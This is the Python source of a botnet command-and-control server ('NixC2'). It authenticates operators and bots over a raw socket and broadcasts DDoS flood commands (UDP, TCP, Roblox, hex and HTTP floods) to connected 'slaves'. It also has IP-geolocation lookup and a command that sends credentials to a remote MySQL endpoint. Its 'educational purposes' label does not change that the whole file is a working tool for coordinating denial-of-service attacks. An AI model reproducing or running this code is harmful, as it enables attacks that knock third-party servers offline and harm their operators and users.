#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from Commands.api import *

# Layer 4
from Commands.Layer4.tcp import tcp
from Commands.Layer4.udp import udp
from Commands.Layer4.roblox import roblox
from Commands.Layer4.tup import tup
from Commands.Layer4.hex import hex as hexfld

# Layer 7
from Commands.Layer7.http_cfb import http_cfb
from Commands.Layer7.http_req import http_req

# Imports
import socket, threading, sys, time, ipaddress,requests
from random import choice,choices,randint
from colorama import Fore, init, Back

data = ""

def color2(data_input_output):
    random_output = data_input_output

    if random_output == "GREEN":
        data = '\033[32m'
    elif random_output == "LIGHTGREEN_EX":
        data = '\033[92m'
    elif random_output == "YELLOW":
        data = '\033[33m'
    elif random_output == "LIGHTYELLOW_EX":
        data = '\033[93m'
    elif random_output == "CYAN":
        data = '\033[36m'
    elif random_output == "LIGHTCYAN_EX":
        data = '\033[96m'
    elif random_output == "BLUE":
        data = '\033[34m'
    elif random_output == "LIGHTBLUE_EX":
        data = '\033[94m'
    elif random_output == "MAGENTA":
        data = '\033[35m'
    elif random_output == "LIGHTMAGENTA_EX":
        data = '\033[95m'
    elif random_output == "RED":
        data = '\033[31m'
    elif random_output == "LIGHTRED_EX":
        data = '\033[91m'
    elif random_output == "BLACK":
        data = '\033[30m'
    elif random_output == "LIGHTBLACK_EX":
        data = '\033[90m'
    elif random_output == "WHITE":
        data = '\033[37m'
    elif random_output == "LIGHTWHITE_EX":
        data = '\033[97m'
    return data

def color():

    random2 = ["GREEN","YELLOW","CYAN","BLUE","MAGENTA","RED","BLACK","WHITE","LIGHTGREEN_EX","LIGHTYELLOW_EX","LIGHTCYAN_EX","LIGHTBLUE_EX","LIGHTMAGENTA_EX","LIGHTRED_EX","LIGHTBLACK_EX","LIGHTWHITE_EX"]
    
    random2.remove('BLACK')
    random2.remove('LIGHTBLACK_EX')

    random = choice((random2))

    if random == "GREEN":
        data = '\033[32m'
    elif random == "LIGHTGREEN_EX":
        data = '\033[92m'
    elif random == "YELLOW":
        data = '\033[33m'
    elif random == "LIGHTYELLOW_EX":
        data = '\033[93m'
    elif random == "CYAN":
        data = '\033[36m'
    elif random == "LIGHTCYAN_EX":
        data = '\033[96m'
    elif random == "BLUE":
        data = '\033[34m'
    elif random == "LIGHTBLUE_EX":
        data = '\033[94m'
    elif random == "MAGENTA":
        data = '\033[35m'
    elif random == "LIGHTMAGENTA_EX":
        data = '\033[95m'
    elif random == "RED":
        data = '\033[31m'
    elif random == "LIGHTRED_EX":
        data = '\033[91m'
    elif random == "BLACK":
        data = '\033[30m'
    elif random == "LIGHTBLACK_EX":
        data = '\033[90m'
    elif random == "WHITE":
        data = '\033[37m'
    elif random == "LIGHTWHITE_EX":
        data = '\033[97m'
    return data
user_name = ""
bots = {}

HINT_PASSWORD = ["MYSQL.ROOT//UPLOADER//USERNAME","MYSQL.R/O/O/T/UPLOADER/USERNAME","MYSQL/.../.././ROOT","MYSQL/..../........","MYSQL","MYSQL/./../.../..../infect.sh","MYSQL.INJECT/..","aCREATE","MYSQL/.../../.","$MYSQL(/.../../.);"]

def get_location(ip_addr,GET_DATA):
    ip_address = ip_addr
    response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()
    network = response.get("network")
    version = response.get("version")

    city = response.get("city")
    region_city = response.get("region")
    country_name = response.get("country_name")
    latitude = response.get("latitude")
    longitude = response.get("longitude")

    timezone = response.get("timezone")
    utc_offset = response.get("utc_offset")

    calling_code = response.get("country_calling_code")
    network = response.get("network")
    languages = response.get("languages")
    currency_name = response.get("currency_name")
    currency = response.get("currency")

    if GET_DATA == "IP_DATA":
        location_data = f'''
# IP DATA
IP            : {ip_address}
NETWORK       : {network}
VERSION       : {version}'''
    elif GET_DATA == "LOCATION":
        location_data = f'''
# LOCATION
CITY          : {city}
REGION        : {region_city}
COUNTRY       : {country_name}
LATITUDE      : {latitude}
LONGITUDE     : {longitude}'''
    elif GET_DATA == "TIME":
        location_data = f'''
# TIME
TIMEZONE      : {timezone}
UTC_OFFSET    : {utc_offset}'''
    elif GET_DATA == "OTHER_DATA":
        location_data = f'''
# OTHER DATA
CALLING_CODE  : {calling_code}
LANGUAGES     : {languages}
CURRYENCY     : {currency}
CURRENCY_NAME : {currency_name}'''
    elif GET_DATA == "ALL_DATA":
        location_data = f'''
# IP DATA
IP            : {ip_address}
NETWORK       : {network}
VERSION       : {version}

# LOCATION
CITY          : {city}
REGION        : {region_city}
COUNTRY       : {country_name}
LATITUDE      : {latitude}
LONGITUDE     : {longitude}

# TIME
TIMEZONE      : {timezone}
UTC_OFFSET    : {utc_offset}

# OTHER DATA
CALLING_CODE  : {calling_code}
LANGUAGES     : {languages}
CURRYENCY     : {currency}
CURRENCY_NAME : {currency_name}'''
    return location_data

def loading(client):
    send(client, f'\33]0;\a', False)
    send(client, ansi_clear, False)
    global user_name
    data = ""
    for number in range(int(randint(1,3))):

        color_random = color()

        send(client, f'''{color_random}█▒▒▒▒▒▒▒▒▒ L _ ⏳''')
        send(client, f'\33]0;L _ ⌛ \a', False)
        time.sleep(0.2)
        send(client, ansi_clear, False)

        send(client, f'''{color_random}██▒▒▒▒▒▒▒▒ LO _ ⌛''')
        send(client, f'\33]0;LO _ ⏳ \a', False)
        time.sleep(0.2)
        send(client, ansi_clear, False)

        send(client, f'''{color_random}███▒▒▒▒▒▒▒ LOA _ ⏳''')
        send(client, f'\33]0;LOA _ ⌛ \a', False)
        time.sleep(0.2)
        send(client, ansi_clear, False)

        send(client, f'''{color_random}█████▒▒▒▒▒ LOAD _ ⌛''')
        send(client, f'\33]0;LOAD _ ⏳ \a', False)
        time.sleep(0.2)
        send(client, ansi_clear, False)

        send(client, f'''{color_random}███████▒▒▒ LOADI _ ⏳''')
        send(client, f'\33]0;LOADI _ ⌛ \a', False)
        time.sleep(0.2)
        send(client, ansi_clear, False)

        send(client, f'''{color_random}█████████▒ LOADIN _ ⌛''')
        send(client, f'\33]0;LOADIN _ ⏳ \a', False)
        time.sleep(0.2)
        send(client, ansi_clear, False)

        send(client, f'''{color_random}██████████ LOADING _ ⏳''')
        send(client, f'\33]0;LOADING _ ⌛ \a', False)
        time.sleep(0.2)
        send(client, ansi_clear, False)
        data = ""
    threading.Thread(target=update_title, args=(client,user_name)).start()
TIITLE_MESSAGE = ''
DATA_TEXT = ''

message_test = f"""
╔═══════════════════════ [{TIITLE_MESSAGE}]
{DATA_TEXT}
╚════════════════════════"""

l_banner = """
     ╔════════════════════════════════════════════════╗
     ║
     ║     ╔╗╔ ╦ ═╗ ╦ ╔═╗╔═╗  
     ║     ║║║ ║ ╔╩╦╝ ║  ╔═╝  
     ║     ╝╚╝ ╩ ╩ ╚═ ╚═╝╚═╝              
     ║                       
     ╚════════════════════════════════════════════════╝
        """

banner = """
     ╔════════════════════════════════════════════════╗
     ║
     ║     ╔╗╔ ╦ ═╗ ╦ ╔═╗╔═╗           Rules:
     ║     ║║║ ║ ╔╩╦╝ ║  ╔═╝  
     ║     ╝╚╝ ╩ ╩ ╚═ ╚═╝╚═╝   Home connections only          
     ║                       
     ║     Discord: Nix:8502    No spamming attacks
     ║
     ║     Type: HELP for help
     ╚════════════════════════════════════════════════╝
        """

about = """
     ╔════════════════════════════╗
     ║* Author : Nix        
     ║
     ║* For educational purposes 
     ╚════════════════════════════╝
"""

help = """
     ╔═════════════════════════════════════════╗
     ║HELP    [Shows list of commands]   
     ║HOW     [Shows usage of attacks]    
     ║METHODS [Shows list of attack methods] 
     ║ABOUT   [About NixC2]          
     ║CLEAR   [Clears the screen]     
     ║LOGOUT  [Disconnects from the net]
     ║EXIT    [Disconnects from the net]
     ╚═════════════════════════════════════════╝
"""

how = """
     ╔═════════════════════════════╗
     ║    How to send attacks  
     ║ [IP] [PORT] [TIME] [SIZE] 
     ╚═════════════════════════════╝
"""

methods = """
     ╔═══════════════════════════════════════════════════════════╗
     ║  Type      Methods               Description           
     ║═══════════════════════════════════════════════════════════╗             
     ║ LAYER4   * .udp         UDP Flood             
     ║ LAYER4   * .tcp         TCP Flood                                   
     ║ LAYER4   * .roblox      Roblox server Flood
     ║ LAYER4   * .tup         Tcp and Udp Flood
     ║ LAYER4   * .hex         Hex Flood
     ║ LAYER7   * .http_cfb    Http cfb Flood
     ║ LAYER7   * .http_req    Http req Flood
     ║ OTHER    * url_to_ip    Get IP Info
     ╚═══════════════════════════════════════════════════════════╝
"""
ansi_clear = '\033[2J\033[H'

# Validate IP
def validate_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private

# Validate Port
def validate_port(port, rand=False):
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

# Validate attack time
def validate_time(time):
    return time.isdigit() and int(time) >= 1 and int(time) <= 999999999999

# Validate buffer size
def validate_size(size):
    return size.isdigit() and int(size) > 0 and int(size) <= 999999999999

count_get_mysql_user_pass = 0
# Read credentials from login file
def find_login(client,username, password):
    global count_get_mysql_user_pass
    data_loader_file_user = ""
    while True:
        try:
            req = requests.get(url='https://www.yourwebsite.com/mysql_db_user.txt')
            print("OK . . .")
            data_loader_file_user = "OK"
        except:
            print("WAITING . . .")
            data_loader_file_user = "NO"
            count_get_mysql_user_pass += 1
        finally:
            if data_loader_file_user == "OK" or data_loader_file_user in "OK":
                break
            else:
                color_random = color()
                send(client, f'''{color_random}WAITING TO GET MYSQL . . .''')
                send(client, f"\33]0;C&C CAN'T GET MYSQL {count_get_mysql_user_pass}\a", False)
                print("TRYING . . .")
    file = open('logins.txt',"wb")
    file.write(req.content)
    file.close()
    loading(client)
    credentials = [x.strip() for x in open('logins.txt').readlines() if x.strip()]
    for x in credentials:
        c_username, c_password = x.split(':')
        if c_username.lower() == username.lower() and c_password == password:
            return True

# Checks if bots are dead
def ping():
    while 1:
        dead_bots = []
        for bot in bots.keys():
            try:
                bot.settimeout(3)
                send(bot, 'PING', False, False)
                if bot.recv(65536).decode() != 'PONG':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)
            
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)

# Client handler
def handle_client(client, address):
    send(client, f' NixC2 | Login: Awaiting Response...\a', False)
    while 1:
        send(client, ansi_clear, False)
        color_random = color()
        for x in l_banner.split('\n'):
            send(client,f'{color_random}'+x)
        send(client, f'{Fore.CYAN}    Username :\x1b[0m ', False, False)
        username = client.recv(65536).decode().strip()
        if not username:
            continue
        break

    # Password Login
    password = ''
    while 1:
        send(client, f'{Fore.LIGHTBLUE_EX}    Password :\x1b[0;38;2;0;0;0m ', False, False)
        while not password.strip(): 
            password = client.recv(65536).decode('cp1252').strip()
        break
        
    # Handle client
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        if not find_login(client,username, password):
            send(client, Fore.RED + f'Invalid user or password')
            time.sleep(1)
            client.close()
            return

        global user_name
        user_name = username

        threading.Thread(target=update_title, args=(client,username)).start()
        threading.Thread(target=command_line, args=[client]).start()

    # Handle bot
    else:
        # Check if bot is already connected
        for x in bots.values():
            if x[0] == address[0]:
                client.close()
                return
        bots.update({client: address})

# Send data to client or bot
def send(socket, data, escape=True, reset=True):
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())

# Send command to all bots
def broadcast(data):
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, f'{data} 32', False, False)
        except:
            dead_bots.append(bot)
    for bot in dead_bots:
        bots.pop(bot)
        bot.close()

# Updates Shell Title
def update_title(client,name):
    try:
        send(client, f'\33]0;NIX.C2 | SLAVES: {len(bots)} | USER: {name}\a', False)
        time.sleep(2)
    except:
        client.close()

color_random = color()

# Telnet Command Line
def command_line(client):
    global DATA_TEXT
    global TIITLE_MESSAGE
    global message_test
    loading(client)
    color_random = color()
    for x in banner.split('\n'):
        send(client,f'{color_random}'+x)
        time.sleep(0.2)
    send(client,f'{color_random}')
    send(client, f"{Fore.GREEN}WELCOME TO NIX.C2 | USER: {user_name} | SLAVES: {len(bots)} 📡")
    prompt = f'{Fore.CYAN}NIX.C2 {Fore.GREEN}$ '
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(65536).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()

            color_random = color()
            
            if command == 'ABOUT':
                loading(client)
                for x in about.split('\n'):
                    send(client,  f'{color_random}' + x)
            elif command == 'HELP':
                loading(client)
                for x in help.split('\n'):
                    send(client,  f'{color_random}' + x)
            elif command == 'HOW':
                loading(client)
                for x in how.split('\n'):
                    send(client,  f'{color_random}' + x)
            elif command == 'METHODS':
                loading(client)
                for x in methods.split('\n'):
                    send(client,  f'{color_random}' + x)
            # Layer 4
            elif command == '.UDP':  # UDP Junk (Random UDP Data)
                udp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear,
                    attack_sent2, broadcast, data)
            elif command == '.TCP':  # TCP Junk (Random UDP Data)
                tcp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear,
                    attack_sent2, broadcast, data)
            elif command == '.TUP':  # TCP/UDP Junk (Random TCP/UDP Data)
                tup(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear,
                    attack_sent2, broadcast, data)
            elif command == '.ROBLOX':  # ROBLOX
                roblox(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear,
                    attack_sent2, broadcast, data)
            elif command == '.HEX':  # HEX
                hexfld(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            # Layer 7
            elif command == '.HTTP_CFB':  # HTTP CFB
                print(args)
                http_cfb(args, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.HTTP_REQ':  # HTTP REQ
                print(args)
                http_req(args,validate_time, send, client, ansi_clear,
                    attack_sent1, broadcast, data)
            elif command == "SET_PROMPT":
                loading(client)
                data_prompt_checker = "YES"
                prompt_code = ""
                prompt_code_color = ""
                if len(args) == 3:
                    prompt_code = args[1]
                    prompt_code_color = args[2]
                    if prompt_code == "OLD_PROMPT":
                        prompt = f'{Fore.CYAN}BOT.c2 {Fore.GREEN}$ '
                    elif prompt_code_color == "SHOW_COLOR":
                        random_color_all = ["GREEN","YELLOW","CYAN","BLUE","MAGENTA","RED","BLACK","WHITE","LIGHTGREEN_EX","LIGHTYELLOW_EX","LIGHTCYAN_EX","LIGHTBLUE_EX","LIGHTMAGENTA_EX","LIGHTRED_EX","LIGHTBLACK_EX","LIGHTWHITE_EX"]
                        send(client, Fore.RED + f' COLOR PROMPT -->')
                        send(client, Fore.RED + f'')
                        for color_setting_prompt in random_color_all:
                            send(client, Fore.RED + f'  {color_setting_prompt}')
                    else:
                        prompt = f'{color2(prompt_code_color)}{prompt_code} '
                else:
                    send(client, Fore.RED + ' .SET_PROMPT [TEXT] [COLOR] 🔧')
            elif command == "SQL_USER":
                if user_name == 'Admin':
                    user_name_get = ""
                    password_get = ""
                    hints_crack = ""
                    if len(args) == 4:
                        hints_crack = args[1]
                        user_name_get = args[2]
                        password_get = args[3]
                        count_number = 0
                        for HINT_PASS in HINT_PASSWORD:
                            count_number += 1
                            if HINT_PASS == hints_crack:
                                send(client, f"{Fore.GREEN}FOUND HINTS ({count_number}%) . . .")
                                req = requests.get(f'https://www.yourwebsite.com/php_mysql.php?SQL_USER={user_name_get}:{password_get}')
                                loading(client)
                                color_random = color()
                                for x in banner.split('\n'):
                                    send(client,f'{color_random}'+x)
                                    time.sleep(0.2)
                                color_random = color()
                                TIITLE_MESSAGE = 'UPLOAD USERNAME/PASSWORD TO MYSQL'
                                DATA_TEXT = f'  USER-{user_name_get} PASS-{password_get} STATUS-{req.status_code}'
                                message_test = f"""
    ╔═══════════════════════ [{TIITLE_MESSAGE}]
    {DATA_TEXT}
    ╚════════════════════════"""
                                for x in message_test.split('\n'):
                                    send(client,f'{color_random}'+x)
                                time.sleep(1)
                            else:
                                send(client, f"{Fore.RED}SCANING HINTS ({count_number}%) . . .")
                                time.sleep(1)
                    else:
                        send(client, Fore.RED + ' SQL_USER [HINT] [USERNAME] [PASSWORD]')
                else:
                    send(client, Fore.RED + ' ONLY ADMINS CAN USE THIS')
            elif command == "URL_TO_IP":
                try:
                    url = ""
                    if len(args) == 2:
                        url = args[1]
                        host = str(url).replace("https://", "").replace("http://", "").replace("www.", "")
                        ip = socket.gethostbyname(host)
                        loading(client)
                        color_random = color()
                        for x in banner.split('\n'):
                            send(client,f'{color_random}'+x)
                            time.sleep(0.2)
                        
                        color_random = color()
                        TIITLE_MESSAGE = 'URL TO IP'
                        DATA_TEXT = f' URL {url} --> IP {ip}'
                        message_test = f"""
╔═══════════════════════ [{TIITLE_MESSAGE}]
{DATA_TEXT}
╚════════════════════════"""
                        for x in message_test.split('\n'):
                            send(client,f'{color_random}'+x)
                    else:
                        send(client, Fore.RED + '  URL_TO_IP [URL]')
                except socket.gaierror:
                    send(client, Fore.RED + '  Invalid website pls check url')
            
            elif command == "IP_TO_LOCAT" or command == "IP_TO_LOCATION" or command == "IP_GEO" or command == "IP_GEOLOCATION" or command == "IP_GEOLOCAT":
                try:
                    ip = ""
                    data_get_location = ""
                    if len(args) == 3:
                        ip = str(args[1])
                        data_get_location = str(args[2])
                        ip_location = get_location(ip,data_get_location)
                        loading(client)
                        color_random = color()
                        for x in banner.split('\n'):
                            send(client,f'{color_random}'+x)
                            time.sleep(0.2)
                        
                        color_random = color()
                        TIITLE_MESSAGE = 'IP TO LOCATION'
                        DATA_TEXT = f'{ip_location}'
                        message_test = f"""
<------ [{TIITLE_MESSAGE}] ------>
{DATA_TEXT}"""
                        for x in message_test.split('\n'):
                            send(client,f'{color_random}'+x)
                    else:
                        send(client, Fore.RED + '  IP_TO_GEO [IP] [DATA]')
                        send(client, Fore.RED + '  DATA -->  IP_DATA LOCATION TIME OTHER_DATA ALL_DATA')
                except socket.gaierror:
                    send(client, Fore.RED + '  Invalid to get data')
            elif command == 'METHODS':
                loading(client)
                layer_get = ""
            elif command == 'CLEAR' or command== "CLS":
                loading(client)
                send(client, ansi_clear, False)
                color_random = color()
                for x in l_banner.split('\n'):
                    send(client, f'{color_random}'+x)
                    time.sleep(0.2)
                send(client, f"{Fore.GREEN}WELCOME TO NIX.C2 | USER: {user_name} | SLAVES: {len(bots)} 📡")
            elif command == 'LOGOUT' or command == "EXIT":
                color_random = color()
                for x in l_banner.split('\n'):
                    send(client,f'{color_random}'+x)
                    time.sleep(0.2)
                send(client, f'{Fore.LIGHTMAGENTA_EX}Successfully Logged out\n')
                time.sleep(1)
                break
            else:
                send(client, Fore.RED + f' {data} Invalid commands 📄!')
            send(client, prompt, False)
        except:
            break
    client.close()

screenedSuccessfully = """
        ╔════════════════════════════════════╗
        ║                                    ║
        ║        Successfully Screened       ║
        ║     ───────────────────────────    ║
        ║            ╔══════════╗            ║
        ╚════════════╣   LOGS   ╠════════════╝
                     ╚══════════╝
"""

def attack_sent1(ip, port, secs, client):
    loading(client)
    color_random = color()
    message_flooding = f"""
                   ╔═════════════════════════════╗
                   ║         Attack sent!        
          ╔═══════════════════════════════════════════════╗
          ║         Attack order sent to: {len(bots)} Slaves
    ╔═══════════════════════════════════════════════════════════╗
    ║
    ║              IP     : {ip}
    ║              Port   : {port}
    ║              Time   : {secs}
    ║ 
    ╚═══════════════════════════════════════════════════════════╝"""
    color_random = color()
    for x in message_flooding.split('\n'):
        send(client,f'{color_random}'+x)
        time.sleep(0.2)
    send(client,f"\033[32mAttack successfully sent!📃")

def attack_sent2(ip, port, secs, size, client):
    loading(client)
    color_random = color()
    message_flooding = f"""
                   ╔═════════════════════════════╗
                   ║         Attack sent!        
          ╔═══════════════════════════════════════════════╗
          ║         Attack order sent to: {len(bots)} Slaves
    ╔═══════════════════════════════════════════════════════════╗
    ║
    ║              IP     : {ip}
    ║              Port   : {port}
    ║              Time   : {secs}
    ║              Size   : {size}
    ║ 
    ╚═══════════════════════════════════════════════════════════╝"""

    for x in message_flooding.split('\n'):
        send(client,f'{color_random}'+x)
        time.sleep(0.2)
    send(client,f"\033[32mSuccessfully sent command 📜")

def main():
    if len(sys.argv) != 2:
        print(f'Usage: screen python3 {sys.argv[0]} <C2 Port>')
        exit()
    port = sys.argv[1]
    if not port.isdigit() or int(port) < 1 or int(port) > 65535:
        print('  Invalid C2 port')
        exit()
    port = int(port)
    init(convert=True)
    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print(screenedSuccessfully)
    try:
        sock.bind(('0.0.0.0', port))
    except:
        print('  Failed to bind port')
        exit()
    sock.listen()
    threading.Thread(target=ping).start() # Start keepalive thread
    # Accept all connections
    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

if __name__ == '__main__':
    try:
        main()
    except Exception:
        print('Error, skipping..')
